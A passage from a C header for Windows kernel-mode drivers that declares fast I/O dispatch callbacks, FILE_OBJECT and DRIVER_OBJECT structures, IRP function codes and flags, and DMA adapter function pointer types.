  IN BOOLEAN Wait,
  OUT PFILE_BASIC_INFORMATION Buffer,
  OUT PIO_STATUS_BLOCK IoStatus,
  IN struct _DEVICE_OBJECT *DeviceObject);
typedef FAST_IO_QUERY_BASIC_INFO *PFAST_IO_QUERY_BASIC_INFO;

typedef BOOLEAN
(NTAPI FAST_IO_QUERY_STANDARD_INFO)(
  IN struct _FILE_OBJECT *FileObject,
  IN BOOLEAN Wait,
  OUT PFILE_STANDARD_INFORMATION Buffer,
  OUT PIO_STATUS_BLOCK IoStatus,
  IN struct _DEVICE_OBJECT *DeviceObject);
typedef FAST_IO_QUERY_STANDARD_INFO *PFAST_IO_QUERY_STANDARD_INFO;

typedef BOOLEAN
(NTAPI FAST_IO_LOCK)(
  IN struct _FILE_OBJECT *FileObject,
  IN PLARGE_INTEGER FileOffset,
  IN PLARGE_INTEGER Length,
  PEPROCESS ProcessId,
  ULONG Key,
  BOOLEAN FailImmediately,
  BOOLEAN ExclusiveLock,
  OUT PIO_STATUS_BLOCK IoStatus,
  IN struct _DEVICE_OBJECT *DeviceObject);
typedef FAST_IO_LOCK *PFAST_IO_LOCK;

typedef BOOLEAN
(NTAPI FAST_IO_UNLOCK_SINGLE)(
  IN struct _FILE_OBJECT *FileObject,
  IN PLARGE_INTEGER FileOffset,
  IN PLARGE_INTEGER Length,
  PEPROCESS ProcessId,
  ULONG Key,
  OUT PIO_STATUS_BLOCK IoStatus,
  IN struct _DEVICE_OBJECT *DeviceObject);
typedef FAST_IO_UNLOCK_SINGLE *PFAST_IO_UNLOCK_SINGLE;

typedef BOOLEAN
(NTAPI FAST_IO_UNLOCK_ALL)(
  IN struct _FILE_OBJECT *FileObject,
  PEPROCESS ProcessId,
  OUT PIO_STATUS_BLOCK IoStatus,
  IN struct _DEVICE_OBJECT *DeviceObject);
typedef FAST_IO_UNLOCK_ALL *PFAST_IO_UNLOCK_ALL;

typedef BOOLEAN
(NTAPI FAST_IO_UNLOCK_ALL_BY_KEY)(
  IN struct _FILE_OBJECT *FileObject,
  PVOID ProcessId,
  ULONG Key,
  OUT PIO_STATUS_BLOCK IoStatus,
  IN struct _DEVICE_OBJECT *DeviceObject);
typedef FAST_IO_UNLOCK_ALL_BY_KEY *PFAST_IO_UNLOCK_ALL_BY_KEY;

typedef BOOLEAN
(NTAPI FAST_IO_DEVICE_CONTROL)(
  IN struct _FILE_OBJECT *FileObject,
  IN BOOLEAN Wait,
  IN PVOID InputBuffer OPTIONAL,
  IN ULONG InputBufferLength,
  OUT PVOID OutputBuffer OPTIONAL,
  IN ULONG OutputBufferLength,
  IN ULONG IoControlCode,
  OUT PIO_STATUS_BLOCK IoStatus,
  IN struct _DEVICE_OBJECT *DeviceObject);
typedef FAST_IO_DEVICE_CONTROL *PFAST_IO_DEVICE_CONTROL;

typedef VOID
(NTAPI FAST_IO_ACQUIRE_FILE)(
  IN struct _FILE_OBJECT *FileObject);
typedef FAST_IO_ACQUIRE_FILE *PFAST_IO_ACQUIRE_FILE;

typedef VOID
(NTAPI FAST_IO_RELEASE_FILE)(
  IN struct _FILE_OBJECT *FileObject);
typedef FAST_IO_RELEASE_FILE *PFAST_IO_RELEASE_FILE;

typedef VOID
(NTAPI FAST_IO_DETACH_DEVICE)(
  IN struct _DEVICE_OBJECT *SourceDevice,
  IN struct _DEVICE_OBJECT *TargetDevice);
typedef FAST_IO_DETACH_DEVICE *PFAST_IO_DETACH_DEVICE;

typedef BOOLEAN
(NTAPI FAST_IO_QUERY_NETWORK_OPEN_INFO)(
  IN struct _FILE_OBJECT *FileObject,
  IN BOOLEAN Wait,
  OUT struct _FILE_NETWORK_OPEN_INFORMATION *Buffer,
  OUT struct _IO_STATUS_BLOCK *IoStatus,
  IN struct _DEVICE_OBJECT *DeviceObject);
typedef FAST_IO_QUERY_NETWORK_OPEN_INFO *PFAST_IO_QUERY_NETWORK_OPEN_INFO;

typedef NTSTATUS
(NTAPI FAST_IO_ACQUIRE_FOR_MOD_WRITE)(
  IN struct _FILE_OBJECT *FileObject,
  IN PLARGE_INTEGER EndingOffset,
  OUT struct _ERESOURCE **ResourceToRelease,
  IN struct _DEVICE_OBJECT *DeviceObject);
typedef FAST_IO_ACQUIRE_FOR_MOD_WRITE *PFAST_IO_ACQUIRE_FOR_MOD_WRITE;

typedef BOOLEAN
(NTAPI FAST_IO_MDL_READ)(
  IN struct _FILE_OBJECT *FileObject,
  IN PLARGE_INTEGER FileOffset,
  IN ULONG Length,
  IN ULONG LockKey,
  OUT PMDL *MdlChain,
  OUT PIO_STATUS_BLOCK IoStatus,
  IN struct _DEVICE_OBJECT *DeviceObject);
typedef FAST_IO_MDL_READ *PFAST_IO_MDL_READ;

typedef BOOLEAN
(NTAPI FAST_IO_MDL_READ_COMPLETE)(
  IN struct _FILE_OBJECT *FileObject,
  IN PMDL MdlChain,
  IN struct _DEVICE_OBJECT *DeviceObject);
typedef FAST_IO_MDL_READ_COMPLETE *PFAST_IO_MDL_READ_COMPLETE;

typedef BOOLEAN
(NTAPI FAST_IO_PREPARE_MDL_WRITE)(
  IN struct _FILE_OBJECT *FileObject,
  IN PLARGE_INTEGER FileOffset,
  IN ULONG Length,
  IN ULONG LockKey,
  OUT PMDL *MdlChain,
  OUT PIO_STATUS_BLOCK IoStatus,
  IN struct _DEVICE_OBJECT *DeviceObject);
typedef FAST_IO_PREPARE_MDL_WRITE *PFAST_IO_PREPARE_MDL_WRITE;

typedef BOOLEAN
(NTAPI FAST_IO_MDL_WRITE_COMPLETE)(
  IN struct _FILE_OBJECT *FileObject,
  IN PLARGE_INTEGER FileOffset,
  IN PMDL MdlChain,
  IN struct _DEVICE_OBJECT *DeviceObject);
typedef FAST_IO_MDL_WRITE_COMPLETE *PFAST_IO_MDL_WRITE_COMPLETE;

typedef BOOLEAN
(NTAPI FAST_IO_READ_COMPRESSED)(
  IN struct _FILE_OBJECT *FileObject,
  IN PLARGE_INTEGER FileOffset,
  IN ULONG Length,
  IN ULONG LockKey,
  OUT PVOID Buffer,
  OUT PMDL *MdlChain,
  OUT PIO_STATUS_BLOCK IoStatus,
  OUT struct _COMPRESSED_DATA_INFO *CompressedDataInfo,
  IN ULONG CompressedDataInfoLength,
  IN struct _DEVICE_OBJECT *DeviceObject);
typedef FAST_IO_READ_COMPRESSED *PFAST_IO_READ_COMPRESSED;

typedef BOOLEAN
(NTAPI FAST_IO_WRITE_COMPRESSED)(
  IN struct _FILE_OBJECT *FileObject,
  IN PLARGE_INTEGER FileOffset,
  IN ULONG Length,
  IN ULONG LockKey,
  IN PVOID Buffer,
  OUT PMDL *MdlChain,
  OUT PIO_STATUS_BLOCK IoStatus,
  IN struct _COMPRESSED_DATA_INFO *CompressedDataInfo,
  IN ULONG CompressedDataInfoLength,
  IN struct _DEVICE_OBJECT *DeviceObject);
typedef FAST_IO_WRITE_COMPRESSED *PFAST_IO_WRITE_COMPRESSED;

typedef BOOLEAN
(NTAPI FAST_IO_MDL_READ_COMPLETE_COMPRESSED)(
  IN struct _FILE_OBJECT *FileObject,
  IN PMDL MdlChain,
  IN struct _DEVICE_OBJECT *DeviceObject);
typedef FAST_IO_MDL_READ_COMPLETE_COMPRESSED *PFAST_IO_MDL_READ_COMPLETE_COMPRESSED;

typedef BOOLEAN
(NTAPI FAST_IO_MDL_WRITE_COMPLETE_COMPRESSED)(
  IN struct _FILE_OBJECT *FileObject,
  IN PLARGE_INTEGER FileOffset,
  IN PMDL MdlChain,
  IN struct _DEVICE_OBJECT *DeviceObject);
typedef FAST_IO_MDL_WRITE_COMPLETE_COMPRESSED *PFAST_IO_MDL_WRITE_COMPLETE_COMPRESSED;

typedef BOOLEAN
(NTAPI FAST_IO_QUERY_OPEN)(
  IN struct _IRP *Irp,
  OUT PFILE_NETWORK_OPEN_INFORMATION NetworkInformation,
  IN struct _DEVICE_OBJECT *DeviceObject);
typedef FAST_IO_QUERY_OPEN *PFAST_IO_QUERY_OPEN;

typedef NTSTATUS
(NTAPI FAST_IO_RELEASE_FOR_MOD_WRITE)(
  IN struct _FILE_OBJECT *FileObject,
  IN struct _ERESOURCE *ResourceToRelease,
  IN struct _DEVICE_OBJECT *DeviceObject);
typedef FAST_IO_RELEASE_FOR_MOD_WRITE *PFAST_IO_RELEASE_FOR_MOD_WRITE;

typedef NTSTATUS
(NTAPI FAST_IO_ACQUIRE_FOR_CCFLUSH)(
  IN struct _FILE_OBJECT *FileObject,
  IN struct _DEVICE_OBJECT *DeviceObject);
typedef FAST_IO_ACQUIRE_FOR_CCFLUSH *PFAST_IO_ACQUIRE_FOR_CCFLUSH;

typedef NTSTATUS
(NTAPI FAST_IO_RELEASE_FOR_CCFLUSH)(
  IN struct _FILE_OBJECT *FileObject,
  IN struct _DEVICE_OBJECT *DeviceObject);
typedef FAST_IO_RELEASE_FOR_CCFLUSH *PFAST_IO_RELEASE_FOR_CCFLUSH;

typedef struct _FAST_IO_DISPATCH {
  ULONG SizeOfFastIoDispatch;
  PFAST_IO_CHECK_IF_POSSIBLE FastIoCheckIfPossible;
  PFAST_IO_READ FastIoRead;
  PFAST_IO_WRITE FastIoWrite;
  PFAST_IO_QUERY_BASIC_INFO FastIoQueryBasicInfo;
  PFAST_IO_QUERY_STANDARD_INFO FastIoQueryStandardInfo;
  PFAST_IO_LOCK FastIoLock;
  PFAST_IO_UNLOCK_SINGLE FastIoUnlockSingle;
  PFAST_IO_UNLOCK_ALL FastIoUnlockAll;
  PFAST_IO_UNLOCK_ALL_BY_KEY FastIoUnlockAllByKey;
  PFAST_IO_DEVICE_CONTROL FastIoDeviceControl;
  PFAST_IO_ACQUIRE_FILE AcquireFileForNtCreateSection;
  PFAST_IO_RELEASE_FILE ReleaseFileForNtCreateSection;
  PFAST_IO_DETACH_DEVICE FastIoDetachDevice;
  PFAST_IO_QUERY_NETWORK_OPEN_INFO FastIoQueryNetworkOpenInfo;
  PFAST_IO_ACQUIRE_FOR_MOD_WRITE AcquireForModWrite;
  PFAST_IO_MDL_READ MdlRead;
  PFAST_IO_MDL_READ_COMPLETE MdlReadComplete;
  PFAST_IO_PREPARE_MDL_WRITE PrepareMdlWrite;
  PFAST_IO_MDL_WRITE_COMPLETE MdlWriteComplete;
  PFAST_IO_READ_COMPRESSED FastIoReadCompressed;
  PFAST_IO_WRITE_COMPRESSED FastIoWriteCompressed;
  PFAST_IO_MDL_READ_COMPLETE_COMPRESSED MdlReadCompleteCompressed;
  PFAST_IO_MDL_WRITE_COMPLETE_COMPRESSED MdlWriteCompleteCompressed;
  PFAST_IO_QUERY_OPEN FastIoQueryOpen;
  PFAST_IO_RELEASE_FOR_MOD_WRITE ReleaseForModWrite;
  PFAST_IO_ACQUIRE_FOR_CCFLUSH AcquireForCcFlush;
  PFAST_IO_RELEASE_FOR_CCFLUSH ReleaseForCcFlush;
} FAST_IO_DISPATCH, *PFAST_IO_DISPATCH;

typedef struct _SECTION_OBJECT_POINTERS {
  PVOID DataSectionObject;
  PVOID SharedCacheMap;
  PVOID ImageSectionObject;
} SECTION_OBJECT_POINTERS, *PSECTION_OBJECT_POINTERS;

typedef struct _IO_COMPLETION_CONTEXT {
  PVOID Port;
  PVOID Key;
} IO_COMPLETION_CONTEXT, *PIO_COMPLETION_CONTEXT;

/* FILE_OBJECT.Flags */
#define FO_FILE_OPEN                 0x00000001
#define FO_SYNCHRONOUS_IO            0x00000002
#define FO_ALERTABLE_IO              0x00000004
#define FO_NO_INTERMEDIATE_BUFFERING 0x00000008
#define FO_WRITE_THROUGH             0x00000010
#define FO_SEQUENTIAL_ONLY           0x00000020
#define FO_CACHE_SUPPORTED           0x00000040
#define FO_NAMED_PIPE                0x00000080
#define FO_STREAM_FILE               0x00000100
#define FO_MAILSLOT                  0x00000200
#define FO_GENERATE_AUDIT_ON_CLOSE   0x00000400
#define FO_QUEUE_IRP_TO_THREAD       0x00000400
#define FO_DIRECT_DEVICE_OPEN        0x00000800
#define FO_FILE_MODIFIED             0x00001000
#define FO_FILE_SIZE_CHANGED         0x00002000
#define FO_CLEANUP_COMPLETE          0x00004000
#define FO_TEMPORARY_FILE            0x00008000
#define FO_DELETE_ON_CLOSE           0x00010000
#define FO_OPENED_CASE_SENSITIVE     0x00020000
#define FO_HANDLE_CREATED            0x00040000
#define FO_FILE_FAST_IO_READ         0x00080000
#define FO_RANDOM_ACCESS             0x00100000
#define FO_FILE_OPEN_CANCELLED       0x00200000
#define FO_VOLUME_OPEN               0x00400000
#define FO_REMOTE_ORIGIN             0x01000000
#define FO_DISALLOW_EXCLUSIVE        0x02000000
#define FO_SKIP_COMPLETION_PORT      0x02000000
#define FO_SKIP_SET_EVENT            0x04000000
#define FO_SKIP_SET_FAST_IO          0x08000000
#define FO_FLAGS_VALID_ONLY_DURING_CREATE FO_DISALLOW_EXCLUSIVE

/* VPB.Flags */
#define VPB_MOUNTED                       0x0001
#define VPB_LOCKED                        0x0002
#define VPB_PERSISTENT                    0x0004
#define VPB_REMOVE_PENDING                0x0008
#define VPB_RAW_MOUNT                     0x0010
#define VPB_DIRECT_WRITES_ALLOWED         0x0020

/* IRP.Flags */

#define SL_FORCE_ACCESS_CHECK             0x01
#define SL_OPEN_PAGING_FILE               0x02
#define SL_OPEN_TARGET_DIRECTORY          0x04
#define SL_STOP_ON_SYMLINK                0x08
#define SL_CASE_SENSITIVE                 0x80

#define SL_KEY_SPECIFIED                  0x01
#define SL_OVERRIDE_VERIFY_VOLUME         0x02
#define SL_WRITE_THROUGH                  0x04
#define SL_FT_SEQUENTIAL_WRITE            0x08
#define SL_FORCE_DIRECT_WRITE             0x10
#define SL_REALTIME_STREAM                0x20

#define SL_READ_ACCESS_GRANTED            0x01
#define SL_WRITE_ACCESS_GRANTED           0x04

#define SL_FAIL_IMMEDIATELY               0x01
#define SL_EXCLUSIVE_LOCK                 0x02

#define SL_RESTART_SCAN                   0x01
#define SL_RETURN_SINGLE_ENTRY            0x02
#define SL_INDEX_SPECIFIED                0x04

#define SL_WATCH_TREE                     0x01

#define SL_ALLOW_RAW_MOUNT                0x01

#define CTL_CODE(DeviceType, Function, Method, Access) \
  (((DeviceType) << 16) | ((Access) << 14) | ((Function) << 2) | (Method))

#define DEVICE_TYPE_FROM_CTL_CODE(ctl) (((ULONG) (ctl & 0xffff0000)) >> 16)

#define METHOD_FROM_CTL_CODE(ctrlCode)          ((ULONG)(ctrlCode & 3))

#define IRP_NOCACHE                     0x00000001
#define IRP_PAGING_IO                   0x00000002
#define IRP_MOUNT_COMPLETION            0x00000002
#define IRP_SYNCHRONOUS_API             0x00000004
#define IRP_ASSOCIATED_IRP              0x00000008
#define IRP_BUFFERED_IO                 0x00000010
#define IRP_DEALLOCATE_BUFFER           0x00000020
#define IRP_INPUT_OPERATION             0x00000040
#define IRP_SYNCHRONOUS_PAGING_IO       0x00000040
#define IRP_CREATE_OPERATION            0x00000080
#define IRP_READ_OPERATION              0x00000100
#define IRP_WRITE_OPERATION             0x00000200
#define IRP_CLOSE_OPERATION             0x00000400
#define IRP_DEFER_IO_COMPLETION         0x00000800
#define IRP_OB_QUERY_NAME               0x00001000
#define IRP_HOLD_DEVICE_QUEUE           0x00002000
#define IRP_RETRY_IO_COMPLETION         0x00004000
#define IRP_CLASS_CACHE_OPERATION       0x00008000

#define IRP_QUOTA_CHARGED                 0x01
#define IRP_ALLOCATED_MUST_SUCCEED        0x02
#define IRP_ALLOCATED_FIXED_SIZE          0x04
#define IRP_LOOKASIDE_ALLOCATION          0x08

/*
** IRP function codes
*/

#define IRP_MJ_CREATE                     0x00
#define IRP_MJ_CREATE_NAMED_PIPE          0x01
#define IRP_MJ_CLOSE                      0x02
#define IRP_MJ_READ                       0x03
#define IRP_MJ_WRITE                      0x04
#define IRP_MJ_QUERY_INFORMATION          0x05
#define IRP_MJ_SET_INFORMATION            0x06
#define IRP_MJ_QUERY_EA                   0x07
#define IRP_MJ_SET_EA                     0x08
#define IRP_MJ_FLUSH_BUFFERS              0x09
#define IRP_MJ_QUERY_VOLUME_INFORMATION   0x0a
#define IRP_MJ_SET_VOLUME_INFORMATION     0x0b
#define IRP_MJ_DIRECTORY_CONTROL          0x0c
#define IRP_MJ_FILE_SYSTEM_CONTROL        0x0d
#define IRP_MJ_DEVICE_CONTROL             0x0e
#define IRP_MJ_INTERNAL_DEVICE_CONTROL    0x0f
#define IRP_MJ_SCSI                       0x0f
#define IRP_MJ_SHUTDOWN                   0x10
#define IRP_MJ_LOCK_CONTROL               0x11
#define IRP_MJ_CLEANUP                    0x12
#define IRP_MJ_CREATE_MAILSLOT            0x13
#define IRP_MJ_QUERY_SECURITY             0x14
#define IRP_MJ_SET_SECURITY               0x15
#define IRP_MJ_POWER                      0x16
#define IRP_MJ_SYSTEM_CONTROL             0x17
#define IRP_MJ_DEVICE_CHANGE              0x18
#define IRP_MJ_QUERY_QUOTA                0x19
#define IRP_MJ_SET_QUOTA                  0x1a
#define IRP_MJ_PNP                        0x1b
#define IRP_MJ_PNP_POWER                  0x1b
#define IRP_MJ_MAXIMUM_FUNCTION           0x1b

#define IRP_MN_SCSI_CLASS                 0x01

#define IRP_MN_START_DEVICE               0x00
#define IRP_MN_QUERY_REMOVE_DEVICE        0x01
#define IRP_MN_REMOVE_DEVICE              0x02
#define IRP_MN_CANCEL_REMOVE_DEVICE       0x03
#define IRP_MN_STOP_DEVICE                0x04
#define IRP_MN_QUERY_STOP_DEVICE          0x05
#define IRP_MN_CANCEL_STOP_DEVICE         0x06

#define IRP_MN_QUERY_DEVICE_RELATIONS       0x07
#define IRP_MN_QUERY_INTERFACE              0x08
#define IRP_MN_QUERY_CAPABILITIES           0x09
#define IRP_MN_QUERY_RESOURCES              0x0A
#define IRP_MN_QUERY_RESOURCE_REQUIREMENTS  0x0B
#define IRP_MN_QUERY_DEVICE_TEXT            0x0C
#define IRP_MN_FILTER_RESOURCE_REQUIREMENTS 0x0D

#define IRP_MN_READ_CONFIG                  0x0F
#define IRP_MN_WRITE_CONFIG                 0x10
#define IRP_MN_EJECT                        0x11
#define IRP_MN_SET_LOCK                     0x12
#define IRP_MN_QUERY_ID                     0x13
#define IRP_MN_QUERY_PNP_DEVICE_STATE       0x14
#define IRP_MN_QUERY_BUS_INFORMATION        0x15
#define IRP_MN_DEVICE_USAGE_NOTIFICATION    0x16
#define IRP_MN_SURPRISE_REMOVAL             0x17
#if (NTDDI_VERSION >= NTDDI_WIN7)
#define IRP_MN_DEVICE_ENUMERATED            0x19
#endif

#define IRP_MN_WAIT_WAKE                  0x00
#define IRP_MN_POWER_SEQUENCE             0x01
#define IRP_MN_SET_POWER                  0x02
#define IRP_MN_QUERY_POWER                0x03

#define IRP_MN_QUERY_ALL_DATA             0x00
#define IRP_MN_QUERY_SINGLE_INSTANCE      0x01
#define IRP_MN_CHANGE_SINGLE_INSTANCE     0x02
#define IRP_MN_CHANGE_SINGLE_ITEM         0x03
#define IRP_MN_ENABLE_EVENTS              0x04
#define IRP_MN_DISABLE_EVENTS             0x05
#define IRP_MN_ENABLE_COLLECTION          0x06
#define IRP_MN_DISABLE_COLLECTION         0x07
#define IRP_MN_REGINFO                    0x08
#define IRP_MN_EXECUTE_METHOD             0x09

#define IRP_MN_REGINFO_EX                 0x0b

typedef struct _FILE_OBJECT {
  CSHORT Type;
  CSHORT Size;
  PDEVICE_OBJECT DeviceObject;
  PVPB Vpb;
  PVOID FsContext;
  PVOID FsContext2;
  PSECTION_OBJECT_POINTERS SectionObjectPointer;
  PVOID PrivateCacheMap;
  NTSTATUS FinalStatus;
  struct _FILE_OBJECT *RelatedFileObject;
  BOOLEAN LockOperation;
  BOOLEAN DeletePending;
  BOOLEAN ReadAccess;
  BOOLEAN WriteAccess;
  BOOLEAN DeleteAccess;
  BOOLEAN SharedRead;
  BOOLEAN SharedWrite;
  BOOLEAN SharedDelete;
  ULONG Flags;
  UNICODE_STRING FileName;
  LARGE_INTEGER CurrentByteOffset;
  volatile ULONG Waiters;
  volatile ULONG Busy;
  PVOID LastLock;
  KEVENT Lock;
  KEVENT Event;
  volatile PIO_COMPLETION_CONTEXT CompletionContext;
  KSPIN_LOCK IrpListLock;
  LIST_ENTRY IrpList;
  volatile PVOID FileObjectExtension;
} FILE_OBJECT, *PFILE_OBJECT;

typedef struct _IO_ERROR_LOG_PACKET {
  UCHAR MajorFunctionCode;
  UCHAR RetryCount;
  USHORT DumpDataSize;
  USHORT NumberOfStrings;
  USHORT StringOffset;
  USHORT EventCategory;
  NTSTATUS ErrorCode;
  ULONG UniqueErrorValue;
  NTSTATUS FinalStatus;
  ULONG SequenceNumber;
  ULONG IoControlCode;
  LARGE_INTEGER DeviceOffset;
  ULONG DumpData[1];
} IO_ERROR_LOG_PACKET, *PIO_ERROR_LOG_PACKET;

typedef struct _IO_ERROR_LOG_MESSAGE {
  USHORT Type;
  USHORT Size;
  USHORT DriverNameLength;
  LARGE_INTEGER TimeStamp;
  ULONG DriverNameOffset;
  IO_ERROR_LOG_PACKET EntryData;
} IO_ERROR_LOG_MESSAGE, *PIO_ERROR_LOG_MESSAGE;

#define ERROR_LOG_LIMIT_SIZE               240

#define IO_ERROR_LOG_MESSAGE_HEADER_LENGTH (sizeof(IO_ERROR_LOG_MESSAGE) - \
                                            sizeof(IO_ERROR_LOG_PACKET) +  \
                                            (sizeof(WCHAR) * 40))

#define ERROR_LOG_MESSAGE_LIMIT_SIZE                                       \
    (ERROR_LOG_LIMIT_SIZE + IO_ERROR_LOG_MESSAGE_HEADER_LENGTH)

#define IO_ERROR_LOG_MESSAGE_LENGTH                                        \
    ((PORT_MAXIMUM_MESSAGE_LENGTH > ERROR_LOG_MESSAGE_LIMIT_SIZE) ?        \
        ERROR_LOG_MESSAGE_LIMIT_SIZE :                                     \
        PORT_MAXIMUM_MESSAGE_LENGTH)

#define ERROR_LOG_MAXIMUM_SIZE (IO_ERROR_LOG_MESSAGE_LENGTH -              \
                                IO_ERROR_LOG_MESSAGE_HEADER_LENGTH)

#ifdef _WIN64
#define PORT_MAXIMUM_MESSAGE_LENGTH    512
#else
#define PORT_MAXIMUM_MESSAGE_LENGTH    256
#endif

typedef enum _DMA_WIDTH {
  Width8Bits,
  Width16Bits,
  Width32Bits,
  Width64Bits,
  WidthNoWrap,
  MaximumDmaWidth
} DMA_WIDTH, *PDMA_WIDTH;

typedef enum _DMA_SPEED {
  Compatible,
  TypeA,
  TypeB,
  TypeC,
  TypeF,
  MaximumDmaSpeed
} DMA_SPEED, *PDMA_SPEED;

/* DEVICE_DESCRIPTION.Version */

#define DEVICE_DESCRIPTION_VERSION        0x0000
#define DEVICE_DESCRIPTION_VERSION1       0x0001
#define DEVICE_DESCRIPTION_VERSION2       0x0002

typedef struct _DEVICE_DESCRIPTION {
  ULONG Version;
  BOOLEAN Master;
  BOOLEAN ScatterGather;
  BOOLEAN DemandMode;
  BOOLEAN AutoInitialize;
  BOOLEAN Dma32BitAddresses;
  BOOLEAN IgnoreCount;
  BOOLEAN Reserved1;
  BOOLEAN Dma64BitAddresses;
  ULONG BusNumber;
  ULONG DmaChannel;
  INTERFACE_TYPE InterfaceType;
  DMA_WIDTH DmaWidth;
  DMA_SPEED DmaSpeed;
  ULONG MaximumLength;
  ULONG DmaPort;
} DEVICE_DESCRIPTION, *PDEVICE_DESCRIPTION;

typedef enum _DEVICE_RELATION_TYPE {
  BusRelations,
  EjectionRelations,
  PowerRelations,
  RemovalRelations,
  TargetDeviceRelation,
  SingleBusRelations,
  TransportRelations
} DEVICE_RELATION_TYPE, *PDEVICE_RELATION_TYPE;

typedef struct _DEVICE_RELATIONS {
  ULONG Count;
  PDEVICE_OBJECT Objects[1];
} DEVICE_RELATIONS, *PDEVICE_RELATIONS;

typedef struct _DEVOBJ_EXTENSION {
  CSHORT Type;
  USHORT Size;
  PDEVICE_OBJECT DeviceObject;
} DEVOBJ_EXTENSION, *PDEVOBJ_EXTENSION;

typedef struct _SCATTER_GATHER_ELEMENT {
  PHYSICAL_ADDRESS Address;
  ULONG Length;
  ULONG_PTR Reserved;
} SCATTER_GATHER_ELEMENT, *PSCATTER_GATHER_ELEMENT;

#if defined(_MSC_EXTENSIONS) || defined(__GNUC__)

#if defined(_MSC_VER)
#if _MSC_VER >= 1200
#pragma warning(push)
#endif
#pragma warning(disable:4200)
#endif /* _MSC_VER */

typedef struct _SCATTER_GATHER_LIST {
  ULONG NumberOfElements;
  ULONG_PTR Reserved;
  SCATTER_GATHER_ELEMENT Elements[1];
} SCATTER_GATHER_LIST, *PSCATTER_GATHER_LIST;

#if defined(_MSC_VER)
#if _MSC_VER >= 1200
#pragma warning(pop)
#else
#pragma warning(default:4200)
#endif
#endif /* _MSC_VER */

#else /* defined(_MSC_EXTENSIONS) || defined(__GNUC__) */

struct _SCATTER_GATHER_LIST;
typedef struct _SCATTER_GATHER_LIST SCATTER_GATHER_LIST, *PSCATTER_GATHER_LIST;

#endif /* defined(_MSC_EXTENSIONS) || defined(__GNUC__) */

typedef NTSTATUS
(NTAPI DRIVER_ADD_DEVICE)(
  IN struct _DRIVER_OBJECT *DriverObject,
  IN struct _DEVICE_OBJECT *PhysicalDeviceObject);
typedef DRIVER_ADD_DEVICE *PDRIVER_ADD_DEVICE;

typedef struct _DRIVER_EXTENSION {
  struct _DRIVER_OBJECT *DriverObject;
  PDRIVER_ADD_DEVICE AddDevice;
  ULONG Count;
  UNICODE_STRING ServiceKeyName;
} DRIVER_EXTENSION, *PDRIVER_EXTENSION;

#define DRVO_UNLOAD_INVOKED               0x00000001
#define DRVO_LEGACY_DRIVER                0x00000002
#define DRVO_BUILTIN_DRIVER               0x00000004

typedef NTSTATUS
(NTAPI DRIVER_INITIALIZE)(
  IN struct _DRIVER_OBJECT *DriverObject,
  IN PUNICODE_STRING RegistryPath);
typedef DRIVER_INITIALIZE *PDRIVER_INITIALIZE;

typedef VOID
(NTAPI DRIVER_STARTIO)(
  IN struct _DEVICE_OBJECT *DeviceObject,
  IN struct _IRP *Irp);
typedef DRIVER_STARTIO *PDRIVER_STARTIO;

typedef VOID
(NTAPI DRIVER_UNLOAD)(
  IN struct _DRIVER_OBJECT *DriverObject);
typedef DRIVER_UNLOAD *PDRIVER_UNLOAD;

typedef NTSTATUS
(NTAPI DRIVER_DISPATCH)(
  IN struct _DEVICE_OBJECT *DeviceObject,
  IN struct _IRP *Irp);
typedef DRIVER_DISPATCH *PDRIVER_DISPATCH;

typedef struct _DRIVER_OBJECT {
  CSHORT Type;
  CSHORT Size;
  PDEVICE_OBJECT DeviceObject;
  ULONG Flags;
  PVOID DriverStart;
  ULONG DriverSize;
  PVOID DriverSection;
  PDRIVER_EXTENSION DriverExtension;
  UNICODE_STRING DriverName;
  PUNICODE_STRING HardwareDatabase;
  struct _FAST_IO_DISPATCH *FastIoDispatch;
  PDRIVER_INITIALIZE DriverInit;
  PDRIVER_STARTIO DriverStartIo;
  PDRIVER_UNLOAD DriverUnload;
  PDRIVER_DISPATCH MajorFunction[IRP_MJ_MAXIMUM_FUNCTION + 1];
} DRIVER_OBJECT, *PDRIVER_OBJECT;

typedef struct _DMA_ADAPTER {
  USHORT Version;
  USHORT Size;
  struct _DMA_OPERATIONS* DmaOperations;
} DMA_ADAPTER, *PDMA_ADAPTER;

typedef enum
{
    DmaComplete,
    DmaAborted,
    DmaError,
    DmaCancelled,
} DMA_COMPLETION_STATUS;

typedef VOID
(NTAPI *PPUT_DMA_ADAPTER)(
  IN PDMA_ADAPTER DmaAdapter);

typedef PVOID
(NTAPI *PALLOCATE_COMMON_BUFFER)(
  IN PDMA_ADAPTER DmaAdapter,
  IN ULONG Length,
  OUT PPHYSICAL_ADDRESS LogicalAddress,
  IN BOOLEAN CacheEnabled);

typedef VOID
(NTAPI *PFREE_COMMON_BUFFER)(
  IN PDMA_ADAPTER DmaAdapter,
  IN ULONG Length,
  IN PHYSICAL_ADDRESS LogicalAddress,
  IN PVOID VirtualAddress,
  IN BOOLEAN CacheEnabled);

typedef NTSTATUS
(NTAPI *PALLOCATE_ADAPTER_CHANNEL)(
  IN PDMA_ADAPTER DmaAdapter,
  IN PDEVICE_OBJECT DeviceObject,
  IN ULONG NumberOfMapRegisters,
  IN PDRIVER_CONTROL ExecutionRoutine,
  IN PVOID Context);

typedef BOOLEAN
(NTAPI *PFLUSH_ADAPTER_BUFFERS)(
  IN PDMA_ADAPTER DmaAdapter,
  IN PMDL Mdl,
  IN PVOID MapRegisterBase,
  IN PVOID CurrentVa,
  IN ULONG Length,
  IN BOOLEAN WriteToDevice);

typedef VOID
(NTAPI *PFREE_ADAPTER_CHANNEL)(
  IN PDMA_ADAPTER DmaAdapter);

typedef VOID
(NTAPI *PFREE_MAP_REGISTERS)(
  IN PDMA_ADAPTER DmaAdapter,
  PVOID MapRegisterBase,
  ULONG NumberOfMapRegisters);

typedef PHYSICAL_ADDRESS
(NTAPI *PMAP_TRANSFER)(
  IN PDMA_ADAPTER DmaAdapter,
  IN PMDL Mdl,
  IN PVOID MapRegisterBase,
  IN PVOID CurrentVa,
  IN OUT PULONG Length,
  IN BOOLEAN WriteToDevice);

typedef ULONG
(NTAPI *PGET_DMA_ALIGNMENT)(
  IN PDMA_ADAPTER DmaAdapter);

typedef ULONG
(NTAPI *PREAD_DMA_COUNTER)(
  IN PDMA_ADAPTER DmaAdapter);

typedef VOID
(NTAPI DRIVER_LIST_CONTROL)(
  IN struct _DEVICE_OBJECT *DeviceObject,
  IN struct _IRP *Irp,
  IN struct _SCATTER_GATHER_LIST *ScatterGather,
  IN PVOID Context);
typedef DRIVER_LIST_CONTROL *PDRIVER_LIST_CONTROL;

typedef NTSTATUS
(NTAPI *PGET_SCATTER_GATHER_LIST)(
  IN PDMA_ADAPTER DmaAdapter,
  IN PDEVICE_OBJECT DeviceObject,
